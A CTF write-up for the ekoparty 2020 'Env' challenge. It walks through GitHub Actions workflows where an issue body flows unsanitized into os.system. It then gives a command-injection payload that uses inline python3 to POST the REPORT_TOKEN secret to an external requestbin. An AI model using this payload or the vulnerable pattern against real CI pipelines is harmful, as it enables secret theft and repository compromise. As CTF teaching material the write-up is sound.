# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
ekoparty 2020

# Category
GIT

# Challenge Name
Env

# Challenge Points
443 pts

# Challenge Description
Environmental challenge! \
[EKOLABS](https://github.com/ekoparty2020/ekolabs)

# Attachments
## README.md
> Colección de herramientas de seguridad desarrolladas en Latino America.
> 
> * [faraday](https://github.com/infobyte/faraday) - Collaborative Penetration Test and Vulnerability Management Platform \
>  ...
> * [DaaS](https://github.com/codexgigassys/daas) - DaaS is a multiplatform, remote and distributed system to decompile lots of samples with a single click.
> 
> ### Contribution
> Tus contribuciones son muy bien recibidas ♥♥♥ !!
> 
> ### Issues
> 
> Si tiene un problema de personal que informar, presente un problema en el repositorio ekoparty-internal! \
>  ...

# Solution
This challenge was the third and final part of a series of `git` challenges, so it continues directly from where `Docs` left off.

So, at this point, we've found an `ssh` keypair in the provided `GitHub` repo (ekoparty2020/ekolabs) and used it to authenticate and clone the ekoparty2020/ekoparty-internal private repository. Here's the readme:
> # EkoParty 2020 issue tracker
> 
> This is the internal ekoparty issue tracker for the 2020 edition.
> 
> Please file any conference issues here for staff triage.
> 
> Note: this repository uses github actions:
> 
> https://docs.github.com/en/actions
> 
> Also, congrats for solving Stage 2!
> 
> EKO{1ca688c86b0548d8f26675d85dd77d73c573ebb6}

We have the previous challenge's flag and a link to `GitHub`'s documentation for "actions." I actually found this while working on previous challlenges, but it turns out that both ekoparty2020/ekolabs and ekoparty2020/ekoparty-internal use `GitHub` `actions`. In the ekolabs repository's `.github` folder there is another folder called `workflows`, containing two files, `issue-bouncer.yml`:
```yaml
name: Bounce issues from public repo to private repo
on:
  issues:
    types: [opened]

jobs:
  issue-label-check:
    runs-on: ubuntu-latest
    steps:
      - name: Check trigger label
        if: ${{ !contains(github.event.issue.labels.*.name, 'Staff Report') }}
        run: |
            echo "No trigger label found, aborting workflow (not an error!)"
            exit 1
      - name: Set up Python3
        if: ${{ success() }}
        uses: actions/setup-python@v1
        with:
          python-version: "3.7"
      - name: Checkout this repo
        if: ${{ success() }}
        uses: actions/checkout@v2
      - name: Run the python3 script for this action
        if: ${{ success() }}
        env:
          # where the bounced issue came from
          SRC_REPO_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SRC_REPO_ISSUE: ${{ github.event.issue.number }}
          # where the bounced issue will go
          DST_REPO: 'ekoparty2020/ekoparty-internal'
          DST_REPO_TOKEN: ${{ secrets.INTERNAL_TOKEN }}
        run: |
          # external report to internal report
          pip3 install pyGithub
          pip3 install sh
          python3 .github/workflows/issue-bouncer.py
```
and `issue-bouncer,py`:
```python
#!/usr/bin/env python3

# a simple way to make public issues private so people can report any issues to us in private

import os
import sys
import re
import hashlib
import time

import sh
from github import Github

def getenv(name):
    val = os.environ.get(name)
    if val == None:
        raise ValueError(f'No such environment variable: {name}')
    return val

def run():
    # pull our repo access
    src_repo = Github(getenv('SRC_REPO_TOKEN')).get_repo(getenv('GITHUB_REPOSITORY'))
    dst_repo = Github(getenv('DST_REPO_TOKEN')).get_repo(getenv('DST_REPO')) # bounce to ekoparty-internal

    # pull the src issue
    src_issue_id = int(getenv('SRC_REPO_ISSUE'))
    src_issue = src_repo.get_issue(src_issue_id)

    # bounce a comment back to the src issue
    src_issue.create_comment('Thank you for submitting a staff report! This issue will be filed to the internal ekoparty2020 staff repo and triaged ASAP!')

    # bounce the issue through to the internal repo
    dst_repo.create_issue(title=src_issue.title, body=src_issue.body, labels=[dst_repo.get_label('Staff Report')])

    # update the source issue title and make contents private
    src_issue.edit(title="This issue has been filed with staff internal repo! Thanks!", body='', state='closed')

    return 0

try:
    sys.exit(run())
except Exception as e:
    print("Error: {0}".format(e))
    sys.exit(1)
```

After a quick read we can see that these just take any `issue`s opened on the ekolabs repo and bounce them over to ekoparty-internal. So what does ekoparty-internal do with them?

If we take a look into ekoparty-internal's `.github` folder, we see another `YAML` file and another `python` script. Let's first take a look at `issue-notify.yml`:
```yaml
name: Trigger an external notification for Staff Reports
on:
  issues:
    types: [opened]

jobs:
  issue-label-check:
    runs-on: ubuntu-latest
    steps:
      - name: Check trigger label
        if: ${{ !contains(github.event.issue.labels.*.name, 'Staff Report') }}
        run: |
            echo "No trigger label found, aborting workflow (not an error!)"
            exit 1
      - name: Set up Python3
        if: ${{ success() }}
        uses: actions/setup-python@v1
        with:
          python-version: "3.7"
      - name: Checkout this repo
        if: ${{ success() }}
        uses: actions/checkout@v2
        with:
          persist-credentials: false
      - name: Run the python3 script for this action
        if: ${{ success() }}
        env:
          REPORT_TOKEN: ${{ secrets.REPORT_TOKEN }}
          ISSUE_TITLE: ${{ github.event.issue.title }}
          ISSUE_BODY: ${{ github.event.issue.body }}
        # allowed to run 1 minute before killing
        timeout-minutes: 1
        run: |
          # external report to internal report
          pip3 install pyGithub
          pip3 install sh
          python3 .github/workflows/issue-notify.py
```
It looks like this one, like the last one, sets a couple environment variables and runs the script. It this point, based on the challenge title and description, I'm guessing the flag is in one of these variables, and since it won't be part of the content of the issue, it's probably in REPORT_TOKEN.

Moving on, here's `issue-notify.py`:
```python
#!/usr/bin/env python3

import os
import sys
import time
import uuid

import sh
from github import Github

def getenv(name):
    val = os.environ.get(name)
    if val == None:
        raise ValueError(f'No such environment variable: {name}')
    return val

def issue_notify(title, body, repo):
    # just echo the body into the report repo at /tmp and our scraper script will pick them up and mail them out to staff@
    notify_id = str(uuid.uuid4())
    # only notify on very important issues to reduce spam!
    if 'very important' in title:
        os.system('echo "%s" > /tmp/%s' % (body, notify_id))
    return

def run():
    issue_notify(getenv('ISSUE_TITLE'), getenv('ISSUE_BODY'), Github(getenv('REPORT_TOKEN')))
    return

try:
    sys.exit(run())
except Exception as e:
    print("Error: {0}".format(e))
    sys.exit(1)
```

Woah hold on just one second! I see a call to `os.system`, with unsterilized user input no less! All we need to do is open an issue on ekoparty2020/ekolabs with "very important" in the title and we can escape `echo`'s quotes and run our own command by putting something like `" command #` in the body.

So now that we can run shell commands, how can we get their output? There are a few ways you could do this, including setting up a reverse shell, but we only really need one output (the REPORT_TOKEN env var) so I just set up a [request bin](https://requestbin.com/) to record an `http` request. We don't know if `curl` is installed on the server, so instead we can make our request with a built-in `python` module whe we know they have installed. Here's what my payload looked like:
```
" && python3 -c "import http.client;c=http.client.HTTPSConnection(\"<requestbin url>");c.request(\"POST\", \"/\", \"{\\\"message\\\":\\\"$REPORT_TOKEN\\\"}\", {\"Content-Type\": \"application/json\"})" #
```
here's the inline `python` formatted a bit nicer:
```python
import http.client

c = http.client.HTTPSConnection("<requestbin url>")
c.request("POST", "/", "{\"message\":\"<report token>\"}", {"Content-Type": "application/json"})
```
A few minutes later my request bin recieved a request and... well I forgot to keep track of the flag somewhere so here's a fake one :)
```
EKO{7hi5_15_f0r_r341_th3_r341_f14g_0k4y}
```